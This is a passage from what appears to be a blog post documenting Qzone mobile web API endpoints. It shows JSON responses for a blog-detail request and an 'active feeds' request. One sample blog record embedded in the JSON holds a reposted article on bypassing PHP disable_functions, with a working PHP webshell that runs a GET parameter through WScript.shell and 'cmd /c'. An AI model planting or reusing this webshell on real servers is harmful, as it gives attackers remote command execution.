class="line">                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"uFansCount"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"uVisitorCount"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isCmtVerifyOpen"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"iCurUserType"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"displayflag"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"vtime"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"authqzoneMedalInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"medal_type"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"medal_state"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"pic_url"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"eUserTypeReport"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"iVipActType"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"openid_users"</span>: &#123;</span><br><span class="line">                    <span class="attr">"openid"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"nickname"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"logo"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"sex"</span>: <span class="number">0</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"useractiontype"</span>: <span class="number">5</span>,</span><br><span class="line">            <span class="attr">"relation_type"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"status"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"talk_user_list"</span>: [],</span><br><span class="line">            <span class="attr">"relation"</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"hostDetail"</span>: &#123;</span><br><span class="line">            <span class="attr">"cell_detail_content"</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"cell_type"</span>: <span class="string">"cell_text"</span>,</span><br><span class="line">                    <span class="attr">"data"</span>: &#123;</span><br><span class="line">                        <span class="attr">"data"</span>: <span class="string">" \n系统组件绕过\n\nwindow com组件(php 5.4)(高版本扩展要自己添加）\n条件：要在php.ini中开启（如图）"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"cell_type"</span>: <span class="string">"cell_pic"</span>,</span><br><span class="line">                    <span class="attr">"data"</span>: &#123;</span><br><span class="line">                        <span class="attr">"picdata"</span>: &#123;</span><br><span class="line">                            <span class="attr">"pic"</span>: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">"type"</span>: <span class="number">3</span>,</span><br><span class="line">                                    <span class="attr">"isAutoPlayGif"</span>: <span class="literal">false</span>,</span><br><span class="line">                                    <span class="attr">"photourl"</span>: &#123;</span><br><span class="line">                                        <span class="attr">"0"</span>: &#123;</span><br><span class="line">                                            <span class="attr">"url"</span>: <span class="string">"http://r.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/o/dLYAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=3QNXAd0DVwEDEDU!&amp;tl=1&amp;su=0184007825&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-0-0&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0"</span>,</span><br><span class="line">                                            <span class="attr">"width"</span>: <span class="number">2100</span>,</span><br><span class="line">                                            <span class="attr">"height"</span>: <span class="number">343</span>,</span><br><span class="line">                                            <span class="attr">"focus_x"</span>: <span class="number">494</span>,</span><br><span class="line">                                            <span class="attr">"focus_y"</span>: <span class="number">171</span>,</span><br><span class="line">                                            <span class="attr">"enlarge_rate"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        <span class="attr">"1"</span>: &#123;</span><br><span class="line">                                            <span class="attr">"url"</span>: <span class="string">"http://b182.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/b/dLYAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=3QNXAd0DVwEDEDU!&amp;tl=1&amp;su=0184007825&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0"</span>,</span><br><span class="line">                                            <span class="attr">"width"</span>: <span class="number">2100</span>,</span><br><span class="line">                                            <span class="attr">"height"</span>: <span class="number">343</span>,</span><br><span class="line">                                            <span class="attr">"focus_x"</span>: <span class="number">494</span>,</span><br><span class="line">                                            <span class="attr">"focus_y"</span>: <span class="number">171</span>,</span><br><span class="line">                                            <span class="attr">"enlarge_rate"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        <span class="attr">"11"</span>: &#123;</span><br><span class="line">                                            <span class="attr">"url"</span>: <span class="string">"http://b182.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/b/dLYAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=3QNXAd0DVwEDEDU!&amp;tl=1&amp;su=0184007825&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-11-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0"</span>,</span><br><span class="line">                                            <span class="attr">"width"</span>: <span class="number">2100</span>,</span><br><span class="line">                                            <span class="attr">"height"</span>: <span class="number">343</span>,</span><br><span class="line">                                            <span class="attr">"focus_x"</span>: <span class="number">494</span>,</span><br><span class="line">                                            <span class="attr">"focus_y"</span>: <span class="number">171</span>,</span><br><span class="line">                                            <span class="attr">"enlarge_rate"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"cell_type"</span>: <span class="string">"cell_text"</span>,</span><br><span class="line">                    <span class="attr">"data"</span>: &#123;</span><br><span class="line">                        <span class="attr">"data"</span>: <span class="string">"\n\n\n利用代码，利用shell上传如下代码到目标服务器上\n&lt;?php\n    $command=$_GET['a'];\n    $wsh = new COM('WScript.shell'); // 生成一个COM对象 Shell.Application也能\n    $exec = $wsh-&gt;exec(\"cmd /c \".$command); // 调用对象方法来执行命令\n    $stdout = $exec-&gt;StdOut();\n    $stroutput = $stdout-&gt;ReadAll();\n    echo $stroutput;\n?&gt;\n利用成功后的结果"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"cell_type"</span>: <span class="string">"cell_pic"</span>,</span><br><span class="line">                    <span class="attr">"data"</span>: &#123;</span><br><span class="line">                        <span class="attr">"picdata"</span>: &#123;</span><br><span class="line">                            <span class="attr">"pic"</span>: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">"type"</span>: <span class="number">3</span>,</span><br><span class="line">                                    <span class="attr">"isAutoPlayGif"</span>: <span class="literal">false</span>,</span><br><span class="line">                                    <span class="attr">"photourl"</span>: &#123;</span><br><span class="line">                                        <span class="attr">"0"</span>: &#123;</span><br><span class="line">                                            <span class="attr">"url"</span>: <span class="string">"http://r.photo.store.qq.com/psb?/相册ID/tiEcJmmwmkdnz28TDLpzZ8HppOvqgI7ghxlEFBy*Vqg!/o/dIMAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=qANvAqgDbwIDEDU!&amp;tl=1&amp;su=055860817&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-0-0&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0"</span>,</span><br><span class="line">                                            <span class="attr">"width"</span>: <span class="number">2100</span>,</span><br><span class="line">                                            <span class="attr">"height"</span>: <span class="number">623</span>,</span><br><span class="line">                                            <span class="attr">"focus_x"</span>: <span class="number">468</span>,</span><br><span class="line">                                            <span class="attr">"focus_y"</span>: <span class="number">311</span>,</span><br><span class="line">                                            <span class="attr">"enlarge_rate"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        <span class="attr">"1"</span>: &#123;</span><br><span class="line">                                            <span class="attr">"url"</span>: <span class="string">"http://b131.photo.store.qq.com/psb?/相册ID/tiEcJmmwmkdnz28TDLpzZ8HppOvqgI7ghxlEFBy*Vqg!/b/dIMAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=qANvAqgDbwIDEDU!&amp;tl=1&amp;su=055860817&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0"</span>,</span><br><span class="line">                                            <span class="attr">"width"</span>: <span class="number">2100</span>,</span><br><span class="line">                                            <span class="attr">"height"</span>: <span class="number">623</span>,</span><br><span class="line">                                            <span class="attr">"focus_x"</span>: <span class="number">468</span>,</span><br><span class="line">                                            <span class="attr">"focus_y"</span>: <span class="number">311</span>,</span><br><span class="line">                                            <span class="attr">"enlarge_rate"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        <span class="attr">"11"</span>: &#123;</span><br><span class="line">                                            <span class="attr">"url"</span>: <span class="string">"http://b131.photo.store.qq.com/psb?/相册ID/tiEcJmmwmkdnz28TDLpzZ8HppOvqgI7ghxlEFBy*Vqg!/b/dIMAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=qANvAqgDbwIDEDU!&amp;tl=1&amp;su=055860817&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-11-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0"</span>,</span><br><span class="line">                                            <span class="attr">"width"</span>: <span class="number">2100</span>,</span><br><span class="line">                                            <span class="attr">"height"</span>: <span class="number">623</span>,</span><br><span class="line">                                            <span class="attr">"focus_x"</span>: <span class="number">468</span>,</span><br><span class="line">                                            <span class="attr">"focus_y"</span>: <span class="number">311</span>,</span><br><span class="line">                                            <span class="attr">"enlarge_rate"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                                            <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"cell_type"</span>: <span class="string">"cell_text"</span>,</span><br><span class="line">                    <span class="attr">"data"</span>: &#123;</span><br><span class="line">                        <span class="attr">"data"</span>: <span class="string">"\n\n\n\n原文地址:"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"cell_type"</span>: <span class="string">"cell_link"</span>,</span><br><span class="line">                    <span class="attr">"data"</span>: &#123;</span><br><span class="line">                        <span class="attr">"data"</span>: <span class="string">" https://xz.aliyun.com/t/5320"</span>,</span><br><span class="line">                        <span class="attr">"url"</span>: <span class="string">"https://www.urlshare.cn/umirror_url_check?_wv=1&amp;srctype=touch&amp;apptype=3ghtml&amp;loginuin=QQ号码&amp;plateform=qzone&amp;url=https%3A%2F%2Fxz.aliyun.com%2Ft%2F5320&amp;src_uin=QQ号码&amp;src_scene=2&amp;cli_scene=getDetail"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cell_operation"</span>: &#123;</span><br><span class="line">            <span class="attr">"busi_param"</span>: &#123;</span><br><span class="line">                <span class="attr">"4"</span>: <span class="string">"PHP Webshell下绕过disable_function的方法"</span>,</span><br><span class="line">                <span class="attr">"16"</span>: <span class="string">"0"</span>,</span><br><span class="line">                <span class="attr">"30"</span>: <span class="string">"0"</span>,</span><br><span class="line">                <span class="attr">"47"</span>: <span class="string">"0"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"weixin_url"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"qq_url"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"share_info"</span>: &#123;</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"PHP Webshell下绕过disable_function的方法"</span>,</span><br><span class="line">                <span class="attr">"summary"</span>: <span class="string">"系统组件绕过window com组件(php 5.4)(高版本扩展要自己添加）条件：要在php.ini中开启（如图）[图片]利用代码，利用shell上传如下代码到目标服务器上&lt;?php    $command=$_GET['a'];    $wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能    $exec = $wsh-&gt;exec(\"cmd /c \".$command); // 调用对象方法来执行命令    $stdout = $exec-&gt;StdOut();    $stroutput = $stdout-&gt;ReadAll();    echo $stroutput;?&gt;利用成功后的结果[图片]原文地址: https://xz.aliyun.com/t/5320"</span>,</span><br><span class="line">                <span class="attr">"photourl"</span>: &#123;</span><br><span class="line">                    <span class="attr">"0"</span>: &#123;</span><br><span class="line">                        <span class="attr">"url"</span>: <span class="string">"http://r.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/o/dLYAAAAAAAAA&amp;bo=3QNXAd0DVwEDEDU!"</span>,</span><br><span class="line">                        <span class="attr">"width"</span>: <span class="number">989</span>,</span><br><span class="line">                        <span class="attr">"height"</span>: <span class="number">343</span>,</span><br><span class="line">                        <span class="attr">"focus_x"</span>: <span class="number">494</span>,</span><br><span class="line">                        <span class="attr">"focus_y"</span>: <span class="number">171</span>,</span><br><span class="line">                        <span class="attr">"enlarge_rate"</span>: <span class="number">200</span>,</span><br><span class="line">                        <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">"1"</span>: &#123;</span><br><span class="line">                        <span class="attr">"url"</span>: <span class="string">"http://b182.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/b/dLYAAAAAAAAA&amp;bo=3QNXAd0DVwEDEDU!"</span>,</span><br><span class="line">                        <span class="attr">"width"</span>: <span class="number">989</span>,</span><br><span class="line">                        <span class="attr">"height"</span>: <span class="number">343</span>,</span><br><span class="line">                        <span class="attr">"focus_x"</span>: <span class="number">494</span>,</span><br><span class="line">                        <span class="attr">"focus_y"</span>: <span class="number">171</span>,</span><br><span class="line">                        <span class="attr">"enlarge_rate"</span>: <span class="number">200</span>,</span><br><span class="line">                        <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">"11"</span>: &#123;</span><br><span class="line">                        <span class="attr">"url"</span>: <span class="string">"http://b182.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/b/dLYAAAAAAAAA&amp;bo=3QNXAd0DVwEDEDU!"</span>,</span><br><span class="line">                        <span class="attr">"width"</span>: <span class="number">989</span>,</span><br><span class="line">                        <span class="attr">"height"</span>: <span class="number">343</span>,</span><br><span class="line">                        <span class="attr">"focus_x"</span>: <span class="number">494</span>,</span><br><span class="line">                        <span class="attr">"focus_y"</span>: <span class="number">171</span>,</span><br><span class="line">                        <span class="attr">"enlarge_rate"</span>: <span class="number">200</span>,</span><br><span class="line">                        <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"ark_sharedata"</span>: &#123;</span><br><span class="line">                    <span class="attr">"ark_id"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"view_id"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"ark_content"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"action_url"</span>: <span class="string">""</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"schema_info"</span>: &#123;</span><br><span class="line">                <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"downloadurl"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"appid"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"postparams"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"usepost"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"schemapageurl"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"appname"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"loadingpage"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"yingyongbao"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">"master_actionurl"</span>: <span class="string">""</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"recomm_cookie"</span>: &#123;&#125;,</span><br><span class="line">            <span class="attr">"click_stream_report"</span>: &#123;&#125;,</span><br><span class="line">            <span class="attr">"qboss_trace"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"custom_btn"</span>: [],</span><br><span class="line">            <span class="attr">"feed_report_cookie"</span>: &#123;</span><br><span class="line">                <span class="attr">"1"</span>: <span class="string">"16842752"</span>,</span><br><span class="line">                <span class="attr">"3"</span>: <span class="string">"QQ号码_2_"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"generic_url"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"bypass_param"</span>: &#123;&#125;,</span><br><span class="line">            <span class="attr">"droplist_cookie"</span>: &#123;&#125;,</span><br><span class="line">            <span class="attr">"rank_param"</span>: &#123;&#125;,</span><br><span class="line">            <span class="attr">"button_gif_url"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"offline_resource_bid"</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cell_visitor"</span>: &#123;</span><br><span class="line">            <span class="attr">"view_count"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"visitor_count"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"visitors"</span>: [],</span><br><span class="line">            <span class="attr">"mod"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"view_count_byfriends"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"myfriend_info"</span>: <span class="string">""</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cell_header"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"tih_year"</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cell_forward_list"</span>: &#123;</span><br><span class="line">            <span class="attr">"num"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"isforward"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"fwdmans"</span>: [],</span><br><span class="line">            <span class="attr">"actionUrl"</span>: <span class="string">"https://h5.qzone.qq.com/forward/list/http%3A%2F%2Fuser.qzone.qq.com%2FQQ号码%2Fblog%2F1559532408_forward/QQ号码/forwardlist?_wv=2098179&amp;_proxy=1"</span>,</span><br><span class="line">            <span class="attr">"extendinfo"</span>: &#123;&#125;,</span><br><span class="line">            <span class="attr">"forwardkey"</span>: <span class="string">"http://user.qzone.qq.com/QQ号码/blog/1559532408_forward"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"attach_info"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"hasmore"</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取活跃动态"><a href="#获取活跃动态" class="headerlink" title="获取活跃动态"></a>获取活跃动态</h4><blockquote>
<p><a href="https://h5.qzone.qq.com/webapp/json/mqzone_feeds/getActiveFeeds?g_tk=见ptqrtoken生成算法(POST)" target="_blank" rel="noopener">https://h5.qzone.qq.com/webapp/json/mqzone_feeds/getActiveFeeds?g_tk=见ptqrtoken生成算法(POST)</a></p>
</blockquote>
<p>res_attach: back_server_info=basetime%3D1588493186%26pagenum%3D4%26dayvalue%3D3%26getadvlast%3D0%26hasgetadv%3D%26lastentertime%3D1589276428%26LastAdvPos%3D0%26UnReadCount%3D0%26UnReadSum%3D0%26LastIsADV%3D0%26UpdatedFollowUins%3D%26UpdatedFollowCount%3D0%26LastRecomBrandID%3D%26gatewayAttach%3D&amp;lastrefreshtime=1589276431&amp;lastseparatortime=0&amp;loadcount=2&amp;refresh_session=QQ号码_1589276431</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"ret"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"data"</span>: &#123;</span><br><span class="line">        <span class="attr">"attachinfo"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"hasmore"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"newcnt"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"undeal_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"active_cnt"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"passive_cnt"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"gamebar_cnt"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"gift_cnt"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"visitor_cnt"</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"vFeeds"</span>: [ </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"comm"</span>: &#123;</span><br><span class="line">                    <span class="attr">"appid"</span>: <span class="number">311</span>,</span><br><span class="line">                    <span class="attr">"subid"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"refer"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"time"</span>: <span class="number">1588947653</span>,</span><br><span class="line">                    <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"originaltype"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"operatemask"</span>: <span class="number">491531</span>,</span><br><span class="line">                    <span class="attr">"feedskey"</span>: <span class="string">"311_0_386661396431323063363661623535653061633430303030"</span>,</span><br><span class="line">                    <span class="attr">"orglikekey"</span>: <span class="string">"http://user.qzone.qq.com/评论好友QQ/mood/8fa9d120c66ab55e0ac40000"</span>,</span><br><span class="line">                    <span class="attr">"curlikekey"</span>: <span class="string">"http://user.qzone.qq.com/评论好友QQ/mood/8fa9d120c66ab55e0ac40000"</span>,</span><br><span class="line">                    <span class="attr">"feedstype"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"feedsattr"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"ugckey"</span>: <span class="string">"评论好友QQ_311_8fa9d120c66ab55e0ac40000_"</span>,</span><br><span class="line">                    <span class="attr">"clientkey"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"show_mask"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"uflag"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"shield"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"ugcrightkey"</span>: <span class="string">"8fa9d120c66ab55e0ac40000"</span>,</span><br><span class="line">                    <span class="attr">"interestkey"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"recomtype"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"feedsid"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"adv_stytle"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"adv_subtype"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"right_info"</span>: &#123;</span><br><span class="line">                        <span class="attr">"ugc_right"</span>: <span class="number">1</span>,</span><br><span class="line">                        <span class="attr">"allow_uins"</span>: []</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">"recomlayout"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"recomreportid"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"space_right"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"reportfeedsattr"</span>: <span class="number">5</span>,</span><br><span class="line">                    <span class="attr">"recom_show_type"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"wup_feeds_type"</span>: <span class="number">100</span>,</span><br><span class="line">                    <span class="attr">"stMapABTest"</span>: &#123;&#125;,</span><br><span class="line">                    <span class="attr">"is_stay"</span>: <span class="literal">false</span>,</span><br><span class="line">                    <span class="attr">"paykey"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"operatemask2"</span>: <span class="number">2752512</span>,</span><br><span class="line">                    <span class="attr">"positionmask"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"positionmask2"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"editmask"</span>: <span class="number">4294967295</span>,</span><br><span class="line">                    <span class="attr">"custom_droplist"</span>: [],</span><br><span class="line">                    <span class="attr">"extendInfo"</span>: &#123;</span><br><span class="line">                        <span class="attr">"_func_type"</span>: <span class="string">"func_friend_feed"</span>,</span><br><span class="line">                        <span class="attr">"is_feeds_long_pics_browsing_mode"</span>: <span class="string">"0"</span>,</span><br><span class="line">                        <span class="attr">"srcappid"</span>: <span class="string">""</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">"feedsattr2"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"feedsDelTime"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"sqDynamicFeedsKey"</span>: <span class="string">"评论好友QQ_1588947653_311_0_8fa9d120c66ab55e0ac40000"</span>,</span><br><span class="line">                    <span class="attr">"iClick_area"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"extendInfoData"</span>: &#123;&#125;,</span><br><span class="line">                    <span class="attr">"hot_score"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"is_kuolie"</span>: <span class="literal">false</span></span><br><span class="line">                &#125;,</span><br><span class="line">                "userinfo": &#123; // 发布人</span><br><span class="line">                    "user": &#123;</span><br><span class="line">                        "uin": 评论好友QQ,</span><br><span class="line">                        "nickname": "儒雅的悟空",</span><br><span class="line">                        "timestamp": 1588947653,</span><br><span class="line">                        "from": 1,</span><br><span class="line">                        "uinkey": "",</span><br><span class="line">                        "logo": "",</span><br><span class="line">                        "vip": 0,</span><br><span class="line">                        "level": 1,</span><br><span class="line">                        "viplevel": 1,</span><br><span class="line">                        "viptype": 0,</span><br><span class="line">                        "qzonedesc": "",</span><br><span class="line">                        "is_owner": 0,</span><br><span class="line">                        "operation_mask": 0,</span><br><span class="line">                        "uid": "",</span><br><span class="line">                        "talk_id": "",</span><br><span class="line">                        "portrait_id": 0,</span><br><span class="line">                        "is_own": 0,</span><br><span class="line">                        "isFamousWhite": 1,</span><br><span class="line">                        "isQzoneUser": 0,</span><br><span class="line">                        "isAnnualVip": 0,</span><br><span class="line">                        "isSetNickGlint": 0,</span><br><span class="line">                        "medalInfo": &#123;</span><br><span class="line">                            "medal_type": 0,</span><br><span class="line">                            "medal_state": 0,</span><br><span class="line">                            "level": 0,</span><br><span class="line">                            "pic_url": "",</span><br><span class="line">                            "jump_url": ""</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "descicon": "",</span><br><span class="line">                        "icon_width": 0,</span><br><span class="line">                        "icon_height": 0,</span><br><span class="line">                        "isSweetVip": 0,</span><br><span class="line">                        "stuStarInfo": &#123;</span><br><span class="line">                            "iStarStatus": 0,</span><br><span class="line">                            "iStarLevel": 0,</span><br><span class="line">                            "isAnnualVip": 0,</span><br><span class="line">                           